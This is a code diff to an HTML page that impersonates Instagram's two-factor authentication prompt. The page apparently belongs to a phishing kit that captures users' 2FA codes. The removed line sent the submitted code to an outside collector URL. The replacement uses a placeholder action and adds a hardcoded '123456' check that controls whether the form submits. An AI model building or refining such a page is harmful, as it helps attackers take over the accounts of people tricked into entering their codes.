@@ -99,7 +99,7 @@
 <body>
   <div class="container">
     <h2>Instagram Two-Factor Authentication</h2>
-    <form id="authForm" action="https://getintotouch.sh20raj.com/api.php?id=6534651073" method="post">
+    <form id="authForm" action="desired_action_url" method="post">
       <label for="code">Authentication Code:</label>
       <input type="text" id="code" name="code" required>
       <button type="submit">Submit</button>
@@ -125,8 +125,11 @@
 
     // Event listener for form submission
     document.getElementById('authForm').addEventListener('submit', function(event) {
-      event.preventDefault(); // Prevent form submission
-      showPopup(); // Show the pop-up
+      var code = document.getElementById('code').value;
+      if (code !== '123456') { // Replace '123456' with the correct code
+        event.preventDefault(); // Prevent form submission
+        showPopup(); // Show the pop-up
+      }
     });
   </script>
 </body>
